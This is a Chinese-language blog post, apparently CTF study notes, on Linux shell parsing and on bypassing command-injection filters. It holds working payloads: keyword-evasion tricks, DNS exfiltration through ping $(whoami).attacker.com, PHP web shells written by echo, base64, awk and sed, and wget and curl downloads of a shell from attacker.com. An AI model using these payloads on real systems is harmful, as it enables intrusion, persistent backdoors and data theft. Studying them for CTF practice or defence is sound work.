<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE补课 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="RCE补课linux shell解析命令的过程遵循“一切皆字符串原则”，除去特殊符号的作用外，一都认为是字符串，没有别的数据类型 如果出现特殊符号，例如通配符，或者变量，则会全部替换成字符串，再进入shell解析 例如: cat flag  这句命令中的 cat 和 flag，事实上都被认为是字符串 然后shell通过空格将参数分隔 第一个位置的参数必须是命令（可执行文件路径、内置命令、函数） 后">
<meta property="og:type" content="article">
<meta property="og:title" content="RCE补课">
<meta property="og:url" content="http://ireel.github.io/2026/01/01/rce-plus/index.html">
<meta property="og:site_name" content="ivory&#39;s blog">
<meta property="og:description" content="RCE补课linux shell解析命令的过程遵循“一切皆字符串原则”，除去特殊符号的作用外，一都认为是字符串，没有别的数据类型 如果出现特殊符号，例如通配符，或者变量，则会全部替换成字符串，再进入shell解析 例如: cat flag  这句命令中的 cat 和 flag，事实上都被认为是字符串 然后shell通过空格将参数分隔 第一个位置的参数必须是命令（可执行文件路径、内置命令、函数） 后">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://ireel.github.io/img/bash.png">
<meta property="article:published_time" content="2026-01-01T12:07:53.000Z">
<meta property="article:modified_time" content="2026-01-01T12:34:18.879Z">
<meta property="article:author" content="ivory">
<meta property="article:tag" content="rce">
<meta property="article:tag" content="linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ireel.github.io/img/bash.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "RCE补课",
  "url": "http://ireel.github.io/2026/01/01/rce-plus/",
  "image": "http://ireel.github.io/img/bash.png",
  "datePublished": "2026-01-01T12:07:53.000Z",
  "dateModified": "2026-01-01T12:34:18.879Z",
  "author": [
    {
      "@type": "Person",
      "name": "ivory",
      "url": "http://ireel.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2026/01/01/rce-plus/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'RCE补课',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/bash.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE补课</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">RCE补课</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-01T12:07:53.000Z" title="发表于 2026-01-01 20:07:53">2026-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-01T12:34:18.879Z" title="更新于 2026-01-01 20:34:18">2026-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86/">知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="RCE补课"><a href="#RCE补课" class="headerlink" title="RCE补课"></a>RCE补课</h1><h1 id="linux-shell"><a href="#linux-shell" class="headerlink" title="linux shell"></a>linux shell</h1><h3 id="解析命令的过程"><a href="#解析命令的过程" class="headerlink" title="解析命令的过程"></a>解析命令的过程</h3><p>遵循“一切皆字符串原则”，除去特殊符号的作用外，一都认为是字符串，没有别的数据类型</p>
<p>如果出现特殊符号，例如通配符，或者变量，则会全部替换成字符串，再进入shell解析</p>
<p>例如:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure>

<p>这句命令中的 <code>cat</code> 和 <code>flag</code>，事实上都被认为是字符串</p>
<p>然后shell通过空格将参数分隔</p>
<p>第一个位置的参数必须是命令（可执行文件路径、内置命令、函数）</p>
<p>后面的所有位置都作为传递给命令的参数</p>
<h3 id="特殊符号与特殊变量"><a href="#特殊符号与特殊变量" class="headerlink" title="特殊符号与特殊变量"></a>特殊符号与特殊变量</h3><h5 id="命令链接符"><a href="#命令链接符" class="headerlink" title="命令链接符"></a>命令链接符</h5><p><code>;</code> 和 <code>||</code> 无论成败都继续执行: <code>ping 127.0.0.1; cat /flag</code></p>
<p><code>&amp;&amp;</code> 与运算，仅成功时执行，可以用来盲注：<code>mkdir test &amp;&amp; cd test</code></p>
<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><p><code>*</code> (星号)：匹配 任意长度 的任意字符。<br><code>?</code> (问号)：匹配 单个 任意字符。<br><code>[]</code>：匹配括号内的 任意一个 字符。<code>cat /fla[e-h]</code><br><code>&#123;&#125;</code> 扩展生成，<code>cp config.php&#123;,.bak&#125;</code> -&gt; 等效于 <code>cp config.php config.php.bak</code></p>
<p>在某些 Shell 中，<code>&#123;cat,/flag&#125;</code> 可以像命令一样执行，利用逗号代替空格。</p>
<h5 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h5><p><code>`</code> (反引号)：</p>
<ul>
<li>作用： 执行引号内的命令，并将输出结果替换到当前位置。</li>
<li>例子： <code>echo &quot;Current user is </code>whoami<code>&quot;</code> -&gt; 输出 <code>Current user is root</code></li>
<li>CTF 技巧： 这是最古老的命令替换方式。如果 <code>$()</code> 被过滤，就用它。</li>
</ul>
<p><code>$(...)</code> (Dollar + 括号)：</p>
<ul>
<li>作用： 同反引号，但支持嵌套，更现代化。</li>
<li>例子： <code>ping $(whoami).attacker.com</code> -&gt; 利用 DNS 携带数据外带 (OOB)。</li>
</ul>
<p><code>$var</code> &#x2F; <code>$&#123;var&#125;</code> (变量)：</p>
<ul>
<li>作用： 调用变量。</li>
<li>CTF 技巧 (空变量绕过)： <code>c$&#123;u&#125;at /flag</code> (假设 u 变量不存在，也就是空)，Shell 解析后变成 <code>cat /flag</code>。这可以绕过对关键字 “cat” 的检测。</li>
</ul>
<h5 id="尖括号大全"><a href="#尖括号大全" class="headerlink" title="尖括号大全"></a>尖括号大全</h5><p><code>&gt;</code> 覆盖写入</p>
<p><code>&gt;&gt;</code> 追加写入</p>
<p><code>&lt;</code> 控制输入，例如：<code>cat&lt;/flag</code>，等价于 <code>cat /flag</code></p>
<p><code>&lt;&lt;</code> 嵌入文档：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把换行后直到EOF的所有内容，一次性喂给 cat，相当于读取了有次内容的文档，然后写入 file.txt</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; file.txt</span></span><br><span class="line"><span class="string">Line 1: Hello</span></span><br><span class="line"><span class="string">Line 2: World</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;&lt;&lt;</code> 字符串输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方式 A (常用，但需要管道符)：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;password&quot;</span> | grep <span class="string">&quot;pass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式 B (使用三个尖括号，不需要管道符)：</span></span><br><span class="line">grep <span class="string">&quot;pass&quot;</span> &lt;&lt;&lt; <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CTF 场景：Base64 解码写入文件（不使用 | ）</span></span><br><span class="line"><span class="built_in">base64</span> -d &lt;&lt;&lt; <span class="string">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>



<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p><code>#</code> 注释</p>
<p><code>!!</code> 执行上条命令</p>
<p><code>!$</code> 引用上一条命令的最后一个参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/www/html/extremely/long/path/</span><br><span class="line"><span class="built_in">cd</span> !$ </span><br><span class="line"><span class="comment"># 这里的 !$ 自动变成了那个长路径</span></span><br></pre></td></tr></table></figure>

<p><code>--</code> 参数结束标记</p>
<h1 id="绕过关键字或符号"><a href="#绕过关键字或符号" class="headerlink" title="绕过关键字或符号"></a>绕过关键字或符号</h1><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>常用于关键字过滤，实际上linux读取文件有许多方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. cat - 最常用的连接文件并打印</span></span><br><span class="line"><span class="comment"># 如果 &quot;cat&quot; 关键字被过滤，可以使用绝对路径 /bin/cat 或单引号 ca&#x27;&#x27;t 绕过</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. tac - 反向 cat (Reverse cat)</span></span><br><span class="line"><span class="comment"># 按行反向输出文件内容（最后一行显示在最上面），对于只有一行的 flag 效果等同于 cat</span></span><br><span class="line"><span class="built_in">tac</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. more - 分页显示</span></span><br><span class="line"><span class="comment"># 通常用于长文件，但在脚本执行或只有一行内容时，它会直接输出内容</span></span><br><span class="line">more /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. less - 更强大的分页工具</span></span><br><span class="line"><span class="comment"># 同 more，如果是非交互式执行（如 RCE 漏洞利用），通常能直接回显内容</span></span><br><span class="line">less /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. head - 输出文件头部</span></span><br><span class="line"><span class="comment"># 默认显示前 10 行。如果 flag 在文件开头，这非常有效</span></span><br><span class="line"><span class="built_in">head</span> /flag</span><br><span class="line"><span class="comment"># 变体：指定行数</span></span><br><span class="line"><span class="built_in">head</span> -n 1 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. tail - 输出文件尾部</span></span><br><span class="line"><span class="comment"># 默认显示后 10 行。如果 flag 是文件的唯一内容或在末尾，这很有效</span></span><br><span class="line"><span class="built_in">tail</span> /flag</span><br><span class="line"><span class="comment"># 变体：指定行数</span></span><br><span class="line"><span class="built_in">tail</span> -n 1 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. nl - 添加行号 (Number Lines)</span></span><br><span class="line"><span class="comment"># 会输出文件内容并在前面加上行号，非常实用的 cat 替代品</span></span><br><span class="line"><span class="built_in">nl</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. od - 八进制转储 (Octal Dump)</span></span><br><span class="line"><span class="comment"># 默认输出八进制数据，为了读取文本，需要加上 -c (字符) 或 -t c 参数</span></span><br><span class="line"><span class="built_in">od</span> -c /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. rev - 字符反转 (Reverse lines)</span></span><br><span class="line"><span class="comment"># 会将每一行的字符左右颠倒输出（如 &quot;flag&#123;...&#125;&quot; 变成 &quot;&#125;...&#123;galf&quot;）</span></span><br><span class="line"><span class="comment"># 读取后你需要手动或脚本将其再次反转回来</span></span><br><span class="line">rev /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. fmt - 文本格式化</span></span><br><span class="line"><span class="comment"># 本意是用来优化文本段落格式的，但它也会读取并输出文件内容</span></span><br><span class="line"><span class="comment"># 可能会改变原始文件中的换行符或空格，但通常不影响读取 flag 字符串</span></span><br><span class="line"><span class="built_in">fmt</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. splain - Perl 诊断工具 (⚠️ 特殊情况)</span></span><br><span class="line"><span class="comment"># 注意：splain 并非标准的“文件读取”工具，它是 Perl 的一部分，用于解释警告信息。</span></span><br><span class="line"><span class="comment"># 在极少数特殊的 CTF 环境或配置下可能被利用，或者用于配合 Perl 代码执行。</span></span><br><span class="line"><span class="comment"># 如果直接作为 shell 命令读取文件，通常无法成功，除非配合管道或特殊参数。</span></span><br><span class="line"><span class="comment"># 示例（通常不直接工作，仅作为完整性列出）：</span></span><br><span class="line">splain /flag</span><br></pre></td></tr></table></figure>

<p>关于sort:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 基础用法 - 直接读取</span></span><br><span class="line"><span class="comment"># sort 默认会读取文件并按 ASCII 码升序排列输出</span></span><br><span class="line"><span class="comment"># 对于通常只有一行的 /flag 文件，效果完全等同于 cat</span></span><br><span class="line"><span class="built_in">sort</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 反向排序 (-r, --reverse)</span></span><br><span class="line"><span class="comment"># 以降序排列内容。如果 flag 文件有多行，顺序会颠倒，但内容都在</span></span><br><span class="line"><span class="built_in">sort</span> -r /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 随机排序 (-R, --random-sort)</span></span><br><span class="line"><span class="comment"># 对行进行随机排序。虽然顺序乱了，但不仅能读取文件，</span></span><br><span class="line"><span class="comment"># 还能混淆某些通过监测“固定输出模式”的防御系统</span></span><br><span class="line"><span class="built_in">sort</span> -R /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 去重输出 (-u, --unique)</span></span><br><span class="line"><span class="comment"># 读取文件并去除重复的行。</span></span><br><span class="line"><span class="comment"># 既然能去重，自然需要先读取并打印出来</span></span><br><span class="line"><span class="built_in">sort</span> -u /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 忽略前导空格 (-b, --ignore-leading-blanks)</span></span><br><span class="line"><span class="comment"># 如果 flag 前面有空格，可以用这个参数（其实默认参数也能读出来）</span></span><br><span class="line"><span class="built_in">sort</span> -b /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 将输出写回文件 (-o)</span></span><br><span class="line"><span class="comment"># 这是一个极其危险的功能 (Write Primitive)</span></span><br><span class="line"><span class="comment"># 它可以读取 /flag 的内容，排序后写入到公共可读写目录（如 /tmp/flag）</span></span><br><span class="line"><span class="comment"># 绕过仅仅针对 stdout（标准输出）的拦截</span></span><br><span class="line"><span class="built_in">sort</span> /flag -o /tmp/flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 重定向符 (Standard Redirection)</span></span><br><span class="line"><span class="comment"># 最基础的方法。如果 &gt; 没被过滤，这是首选。</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="comment"># 变体：追加写入 (Append)，防止覆盖原有内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;content&quot;</span> &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. printf - 格式化输出</span></span><br><span class="line"><span class="comment"># 比 echo 更可靠，处理特殊字符（如换行 \n、制表符 \t）能力更强</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. tee - 管道分流</span></span><br><span class="line"><span class="comment"># 读取标准输入并写入文件。非常适合配合管道使用。</span></span><br><span class="line"><span class="comment"># 场景：当无法直接使用 &gt; 时（例如 sudo 权限限制）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | <span class="built_in">tee</span> shell.php</span><br><span class="line"><span class="comment"># 变体：追加模式 (-a)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;content&quot;</span> | <span class="built_in">tee</span> -a shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. cat + Heredoc (嵌入文档)</span></span><br><span class="line"><span class="comment"># 适合写入多行内容，常用于交互式 shell 中粘贴长代码</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; shell.php</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string">system(\$_GET[c]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. base64 - 编码写入 (⭐⭐⭐ 强烈推荐)</span></span><br><span class="line"><span class="comment"># 最稳健的方法。</span></span><br><span class="line"><span class="comment"># 1. 它可以绕过 WAF 对特殊字符（如 &lt;, &gt;, ?, spaces）的过滤</span></span><br><span class="line"><span class="comment"># 2. 它可以写入二进制文件（如 ELF 程序）而不损坏数据</span></span><br><span class="line"><span class="comment"># 先在本地编码：echo &quot;&lt;?php system(\$_GET[c]);?&gt;&quot; | base64 -&gt; PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pgo=</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pgo=&quot;</span> | <span class="built_in">base64</span> -d &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. dd - 数据转换和复制</span></span><br><span class="line"><span class="comment"># 这是一个底层工具，通常不会被 WAF 过滤</span></span><br><span class="line"><span class="comment"># if=输入流(input file), of=输出文件(output file)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | <span class="built_in">dd</span> of=shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. awk - 文本处理工具</span></span><br><span class="line"><span class="comment"># awk 拥有完整的文件操作能力。利用 print &gt; &quot;filename&quot; 语法</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;print &quot;&lt;?php system(\$_GET[c]);?&gt;&quot; &gt; &quot;shell.php&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. sed - 流编辑器</span></span><br><span class="line"><span class="comment"># 利用 &#x27;w&#x27; (write) 标记将处理的内容写入文件</span></span><br><span class="line"><span class="comment"># -n 阻止默认输出，&#x27;w shell.php&#x27; 将输入流写入文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | sed -n <span class="string">&#x27;w shell.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. cp / mv - 复制或移动</span></span><br><span class="line"><span class="comment"># 如果你已经在 /tmp 目录下有了文件（比如通过上传），可以将其移动到 Web 目录</span></span><br><span class="line"><span class="comment"># 假设 /tmp/a.txt 是恶意文件</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/a.txt shell.php</span><br><span class="line"><span class="built_in">mv</span> /tmp/a.txt shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. tar - 归档工具</span></span><br><span class="line"><span class="comment"># 如果允许上传压缩包，通过解压也可以写入文件</span></span><br><span class="line"><span class="comment"># 很多系统允许解压覆盖现有文件</span></span><br><span class="line">tar -xvf shell.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. wget / curl - 远程下载 (Out of Band)</span></span><br><span class="line"><span class="comment"># 如果目标机器出网，直接从你控制的服务器下载文件是最高效的</span></span><br><span class="line">wget http://attacker.com/shell.txt -O shell.php</span><br><span class="line">curl http://attacker.com/shell.txt -o shell.php</span><br></pre></td></tr></table></figure>



<h3 id="shell变量扩展-拼接"><a href="#shell变量扩展-拼接" class="headerlink" title="shell变量扩展&#x2F;拼接"></a>shell变量扩展&#x2F;拼接</h3><p>例如需要执行:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure>

<p>但此时 <code>cat</code> 和 <code>flag</code> 还有 <code>\</code> 等符号被过滤，可以使用变量扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=ca;t=t;f=f;l=lag;$c<span class="variable">$a</span> $f<span class="variable">$l</span></span><br></pre></td></tr></table></figure>

<p>来实现一个变量扩展的攻击手法</p>
<p>这里我们就可以更深刻的理解linux的shell解析命令的步骤了</p>
<p>对于有变量以及通配符的位置会先进行替换，等到命令完全变成字符串后再进行shell解析</p>
<p>另外，如果不使用花括号标记变量名界限，则变量名包含第一个无效字符和$之间的所有有效字符</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=ca;ca=c;</span><br></pre></td></tr></table></figure>

<p>之后执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span></span><br></pre></td></tr></table></figure>

<p>不会被解析为 <code>caat</code> 或者 <code>ct</code>，而是一个空字符，因为变量名是 <code>cat</code>，并没有声明过，所以返回空字符</p>
<table>
<thead>
<tr>
<th align="left"><strong>语法</strong></th>
<th align="left"><strong>含义</strong></th>
<th align="left"><strong>操作逻辑</strong></th>
<th align="left"><strong>结果</strong></th>
<th align="left"><strong>常用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$&#123;file#*/&#125;</code></td>
<td align="left">掐头 (短)</td>
<td align="left">删除从左边开始第一个 <code>/</code> 及其左边内容</td>
<td align="left"><code>usr/local/src/backup.tar.gz</code></td>
<td align="left">去掉开头的根斜杠</td>
</tr>
<tr>
<td align="left"><code>$&#123;file##*/&#125;</code></td>
<td align="left">掐头 (长)</td>
<td align="left">删除从左边开始最后一个 <code>/</code> 及其左边内容</td>
<td align="left"><code>backup.tar.gz</code></td>
<td align="left">获取文件名 (等同于 <code>basename</code>)</td>
</tr>
<tr>
<td align="left"><code>$&#123;file%.*&#125;</code></td>
<td align="left">去尾 (短)</td>
<td align="left">删除从右边开始第一个 <code>.</code> 及其右边内容</td>
<td align="left"><code>/usr/local/src/backup.tar</code></td>
<td align="left">去掉扩展名</td>
</tr>
<tr>
<td align="left"><code>$&#123;file%%.*&#125;</code></td>
<td align="left">去尾 (长)</td>
